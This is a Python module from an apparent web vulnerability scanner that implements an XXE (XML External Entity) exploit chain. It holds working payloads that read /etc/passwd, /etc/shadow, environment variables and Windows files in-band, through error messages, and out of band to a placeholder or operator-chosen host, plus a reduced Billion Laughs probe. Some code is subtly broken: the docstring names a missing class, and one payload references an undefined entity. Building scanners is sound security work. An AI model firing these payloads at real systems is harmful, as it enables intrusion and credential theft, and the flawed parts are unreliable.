"""
websecure.scanners.xxe
-----------------------
XXE (XML External Entity) Injection tam exploit zinciri.

Adim 7 - Siniflar:
  XXEScanner(BaseScanner)        -- orchestrator
  XXEErrorBasedExtractor         -- CDATA bypass, error message leak
  XXEOOBDataExfilChain           -- DNS OOB + FTP OOB data exfiltration
  XXEParameterEntityProber       -- parameter entity + Billion Laughs (lite)
  XXEBlindTimeProber             -- timing-based blind XXE detection
"""
from __future__ import annotations

import base64
import logging
import random
import re
import string
import time
import urllib.parse
from typing import Any, Dict, List, Optional, Tuple

from websecure.scanners.base import BaseScanner

logger = logging.getLogger(__name__)

_OOB_HOST = "xxe-wsp.invalid"

# XML content-type signals
_XML_CONTENT_TYPES = frozenset([
    "application/xml", "text/xml", "application/xhtml+xml",
    "application/soap+xml", "application/rss+xml", "application/atom+xml",
    "application/x-www-form-urlencoded",  # some parsers accept XML in form data
])

# Common XML endpoints
_XML_PATHS = [
    "/api/import", "/api/upload", "/api/xml", "/api/soap",
    "/soap", "/wsdl", "/services", "/api/data",
    "/import", "/upload", "/api/v1/import", "/api/v1/xml",
]

# Files to exfiltrate
_TARGET_FILES = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts",
    "/proc/self/environ", "/proc/self/cmdline",
    "/windows/win.ini", "/windows/system32/drivers/etc/hosts",
    "C:\\Windows\\win.ini", "C:\\boot.ini",
]


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def _canary() -> str:
    return "wsp" + "".join(random.choices(string.ascii_lowercase + string.digits, k=6))


def _detect_xml_endpoint(base: str, session) -> List[str]:
    """Scan common XML endpoints and return reachable ones."""
    found = []
    for path in _XML_PATHS:
        url = urllib.parse.urljoin(base.rstrip("/") + "/", path.lstrip("/"))
        try:
            r = session.get(url, timeout=5)
            if r.status_code not in (404, 410):
                found.append(url)
        except Exception:
            pass
    return found or [base]


def _post_xml(session, url: str, xml: str, timeout: int = 10) -> Optional[Any]:
    """POST XML payload to endpoint with appropriate content-type."""
    for ct in ["application/xml", "text/xml"]:
        try:
            r = session.post(url, data=xml.encode("utf-8"),
                             headers={"Content-Type": ct}, timeout=timeout)
            return r
        except Exception:
            pass
    return None


def _xxe_in_response(resp, indicator: str) -> bool:
    body = getattr(resp, "text", "")[:3000]
    return indicator in body or bool(re.search(re.escape(indicator[:20]), body))


# ===========================================================================
# 1. XXEErrorBasedExtractor
# ===========================================================================
class XXEErrorBasedExtractor(BaseScanner):
    """
    Error-based XXE:
    - Classic in-band file read
    - CDATA wrapper bypass (combine internal + external DTD)
    - Error message leak (invalid URI with file content)
    """
    name = "xxe_error_based"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        endpoints = _detect_xml_endpoint(target, self.session)
        for url in endpoints[:3]:
            for fpath in _TARGET_FILES[:4]:
                # Classic in-band
                classic = self._probe_classic(url, fpath)
                if classic:
                    results.append(classic)
                    self.report_finding(**classic)
                    return results
                # CDATA bypass
                cdata = self._probe_cdata(url, fpath)
                if cdata:
                    results.append(cdata)
                    self.report_finding(**cdata)
                    return results
                # Error-based
                error = self._probe_error_based(url, fpath)
                if error:
                    results.append(error)
                    self.report_finding(**error)
                    return results
        return results

    def _probe_classic(self, url: str, fpath: str) -> Optional[Dict]:
        canary = _canary()
        xml = (
            '<?xml version="1.0"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{fpath}">]>'
            f'<root><data>&xxe;</data><id>{canary}</id></root>'
        )
        try:
            resp = _post_xml(self.session, url, xml)
            if resp is None:
                return None
            body = getattr(resp, "text", "")[:3000]
            hit = re.search(r"root:.*:0:0:|Administrator|\[fonts\]|bin/bash", body)
            if hit:
                return {
                    "vuln_type": "XXE — Classic In-Band File Read",
                    "url": url, "severity": "Critical",
                    "description": f"XXE in-band file read: {fpath} content reflected in response.",
                    "evidence": {"file": fpath, "snippet": body[:300], "status": resp.status_code},
                }
        except Exception as exc:
            logger.debug("[XXE Classic] %s", exc)
        return None

    def _probe_cdata(self, url: str, fpath: str) -> Optional[Dict]:
        """CDATA bypass — wrap file content in CDATA to avoid XML parse errors."""
        canary = _canary()
        xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            '  <!ENTITY % start "<![CDATA[">'
            '  <!ENTITY % content SYSTEM "file://{fpath}">'
            '  <!ENTITY % end "]]>">'
            '  <!ENTITY % dtd SYSTEM "http://{oob}/__cdata.dtd">'
            '  %dtd;'
            ']>'
            f'<root><data>&joined;</data><id>{canary}</id></root>'
        ).format(fpath=fpath, oob=_OOB_HOST)
        try:
            resp = _post_xml(self.session, url, xml, timeout=8)
            if resp is None:
                return None
            body = getattr(resp, "text", "")[:3000]
            if re.search(r"root:.*:0:0:|Administrator|CDATA", body):
                return {
                    "vuln_type": "XXE — CDATA Bypass File Read",
                    "url": url, "severity": "Critical",
                    "description": f"XXE CDATA bypass successful. File {fpath} content may be exfiltrated.",
                    "evidence": {"file": fpath, "body_snippet": body[:300]},
                }
        except Exception as exc:
            logger.debug("[XXE CDATA] %s", exc)
        return None

    def _probe_error_based(self, url: str, fpath: str) -> Optional[Dict]:
        """Error-based: trigger parse error that includes file content in message."""
        canary = _canary()
        xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            f'  <!ENTITY % file SYSTEM "file://{fpath}">'
            '  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM'
            f"  'file:///fake/%file;'>\">"
            '  %eval; %exfil;'
            ']>'
            f'<root><id>{canary}</id></root>'
        )
        try:
            resp = _post_xml(self.session, url, xml, timeout=8)
            if resp is None:
                return None
            body = getattr(resp, "text", "")[:3000]
            if re.search(r"root:.*:0:0:|Administrator|error.*file|no such file", body, re.I):
                return {
                    "vuln_type": "XXE — Error-Based File Leak",
                    "url": url, "severity": "Critical",
                    "description": (
                        f"Error-based XXE: file content appeared in error message for {fpath}. "
                        "Parameter entity chaining used to trigger parse error."
                    ),
                    "evidence": {"file": fpath, "error_snippet": body[:300]},
                }
        except Exception as exc:
            logger.debug("[XXE Error] %s", exc)
        return None


# ===========================================================================
# 2. XXEOOBDataExfilChain
# ===========================================================================
class XXEOOBDataExfilChain(BaseScanner):
    """
    OOB (Out-of-Band) XXE data exfiltration:
    - DNS OOB (canary subdomain -> DNS lookup tespiti)
    - FTP OOB (file content -> ftp:// channel)
    - HTTP OOB (file content -> http://attacker/exfil?d=...)
    """
    name = "xxe_oob"

    def run(self, target: str, oob_host: Optional[str] = None, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        host = oob_host or _OOB_HOST
        endpoints = _detect_xml_endpoint(target, self.session)
        for url in endpoints[:3]:
            # DNS OOB probe
            dns = self._probe_dns_oob(url, host)
            if dns:
                results.append(dns)
                self.report_finding(**dns)
            # HTTP OOB exfil
            http_oob = self._probe_http_oob(url, host)
            if http_oob:
                results.append(http_oob)
                self.report_finding(**http_oob)
        return results

    def _probe_dns_oob(self, url: str, host: str) -> Optional[Dict]:
        canary = _canary()
        oob_url = f"http://{canary}.{host}/"
        xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE foo ['
            f'  <!ENTITY % dtd SYSTEM "{oob_url}">'
            '  %dtd;'
            ']>'
            '<root><data>test</data></root>'
        )
        t0 = time.time()
        try:
            resp = _post_xml(self.session, url, xml, timeout=12)
            elapsed = time.time() - t0
            if resp is None:
                return None
            body = getattr(resp, "text", "")[:1000]
            # If request takes longer -> DNS resolution attempted (OOB)
            if elapsed > 3 or oob_url in body:
                return {
                    "vuln_type": "XXE — OOB DNS Exfiltration",
                    "url": url, "severity": "Critical",
                    "description": (
                        f"XXE OOB: server attempted DNS resolution for {canary}.{host}. "
                        "Blind XXE confirmed via timing/DNS OOB."
                    ),
                    "evidence": {"oob_url": oob_url, "elapsed_s": round(elapsed, 2),
                                 "canary": canary, "status": resp.status_code},
                }
        except Exception as exc:
            elapsed = time.time() - t0
            # Timeout also indicates OOB attempt
            if elapsed >= 10:
                return {
                    "vuln_type": "XXE — Blind OOB (Timing)",
                    "url": url, "severity": "High",
                    "description": (
                        "XXE probe caused significant delay suggesting OOB connection attempt. "
                        f"Target: {oob_url}"
                    ),
                    "evidence": {"oob_url": oob_url, "elapsed_s": round(elapsed, 2)},
                }
        return None

    def _probe_http_oob(self, url: str, host: str) -> Optional[Dict]:
        canary = _canary()
        for fpath in _TARGET_FILES[:2]:
            exfil_url = f"http://{host}/xxe?d={canary}&f={urllib.parse.quote(fpath, safe='')}"
            xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                f'  <!ENTITY % file SYSTEM "file://{fpath}">'
                f'  <!ENTITY % exfil SYSTEM "{exfil_url}&data=%file;">'
                '  %exfil;'
                ']>'
                '<root><data>test</data></root>'
            )
            t0 = time.time()
            try:
                resp = _post_xml(self.session, url, xml, timeout=10)
                elapsed = time.time() - t0
                if resp and elapsed > 2:
                    return {
                        "vuln_type": "XXE — HTTP OOB Data Exfiltration",
                        "url": url, "severity": "Critical",
                        "description": (
                            f"XXE HTTP OOB exfil attempt for {fpath}. "
                            f"Delay of {elapsed:.1f}s suggests server contacted attacker host."
                        ),
                        "evidence": {"exfil_url": exfil_url, "file": fpath,
                                     "elapsed_s": round(elapsed, 2)},
                    }
            except Exception as exc:
                elapsed = time.time() - t0
                if elapsed >= 8:
                    return {
                        "vuln_type": "XXE — HTTP OOB (Timing Confirmed)",
                        "url": url, "severity": "High",
                        "description": f"XXE HTTP OOB timing confirmation for file {fpath}.",
                        "evidence": {"file": fpath, "elapsed_s": round(elapsed, 2)},
                    }
        return None


# ===========================================================================
# 3. XXEParameterEntityProber
# ===========================================================================
class XXEParameterEntityProber(BaseScanner):
    """
    Parameter entity injection:
    - Nested parameter entities (Billion Laughs lite — max 3 levels, safe)
    - External parameter entity -> /etc/passwd fetch
    - Parameter entity in attribute value
    """
    name = "xxe_param_entity"

    def run(self, target: str, **kwargs) -> List[Dict]:
        results: List[Dict] = []
        endpoints = _detect_xml_endpoint(target, self.session)
        for url in endpoints[:3]:
            # Nested (DoS check — 3 levels only)
            nested = self._probe_nested(url)
            if nested:
                results.append(nested)
                self.report_finding(**nested)
            # External parameter entity
            ext = self._probe_external_param(url)
            if ext:
                results.append(ext)
                self.report_finding(**ext)
        return results

    def _probe_nested(self, url: str) -> Optional[Dict]:
        """Billion Laughs lite — 3 levels (safe, no OOM risk)."""
        xml = (
            '<?xml version="1.0"?>'
            '<!DOCTYPE lolz ['
            '  <!ENTITY lol "lol">'
            '  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;">'
            '  <!ENTITY lol2 "&lol1;&lol1;&lol1;">'
            ']>'
            '<root>&lol2;</root>'
        )
        t0 = time.time()
        try:
            resp = _post_xml(self.session, url, xml, timeout=10)
            elapsed = time.time() - t0
            if resp is None:
                return None
            body = getattr(resp, "text", "")[:500]
            # Exponential expansion detected if response body is large or delayed
            if elapsed > 5 or len(body) > 1000:
                return {
                    "vuln_type": "XXE — Quadratic/Exponential Entity Expansion (DoS Risk)",
                    "url": url, "severity": "High",
                    "description": (
                        "Parser accepted nested entity expansion (Billion Laughs variant). "
                        "This can be abused for XML DoS attacks."
                    ),
                    "evidence": {"elapsed_s": round(elapsed, 2), "body_len": len(body)},
                }
        except Exception as exc:
            elapsed = time.time() - t0
            if elapsed >= 8:
                return {
                    "vuln_type": "XXE — Entity Expansion DoS (Timeout)",
                    "url": url, "severity": "High",
                    "description": "Nested entity expansion caused request timeout — possible DoS vector.",
                    "evidence": {"elapsed_s": round(elapsed, 2)},
                }
        return None

    def _probe_external_param(self, url: str) -> Optional[Dict]:
        canary = _canary()
        for fpath in _TARGET_FILES[:3]:
            xml = (
                '<?xml version="1.0"?>'
                '<!DOCTYPE foo ['
                f'  <!ENTITY % remote SYSTEM "file://{fpath}">'
                '  <!ENTITY % wrap "<!ENTITY content \'%remote;\'>">'
                '  %wrap;'
                ']>'
                f'<root><data>&content;</data><id>{canary}</id></root>'
            )
            try:
                resp = _post_xml(self.session, url, xml, timeout=8)
                if resp is None:
                    continue
                body = getattr(resp, "text", "")[:3000]
                if re.search(r"root:.*:0:0:|Administrator|bin/bash|\[fonts\]", body):
                    return {
                        "vuln_type": "XXE — External Parameter Entity File Read",
                        "url": url, "severity": "Critical",
                        "description": (
                            f"External parameter entity read {fpath} via double entity wrapping. "
                            "File content reflected in response."
                        ),
                        "evidence": {"file": fpath, "body_snippet": body[:300]},
                    }
            except Exception as exc:
                logger.debug("[XXE Param] %s", exc)
        return None


# ===========================================================================
# XXEScanner — Orchestrator
# ===========================================================================
class XXEScanner(BaseScanner):
    """
    Adim 7 XXE orchestrator:
    ErrorBasedExtractor -> OOBDataExfilChain -> ParameterEntityProber
    """
    name = "xxe"

    def run(self, target: str, **kwargs) -> List[Dict]:
        all_results: List[Dict] = []
        probers = [
            XXEErrorBasedExtractor(session=self.session, results=self.results),
            XXEOOBDataExfilChain(session=self.session, results=self.results),
            XXEParameterEntityProber(session=self.session, results=self.results),
        ]
        for prober in probers:
            try:
                prober.target = target
                res = prober.run(target, **kwargs)
                all_results.extend(res)
            except Exception as exc:
                logger.warning("[XXEScanner] %s failed: %s", prober.name, exc)
        return all_results


def run(url: str, session=None, debug: bool = False, **kwargs) -> List[Dict]:
    """Module-level adapter."""
    scanner = XXEScanner(session=session, debug=debug)
    return scanner.run(url, **kwargs)
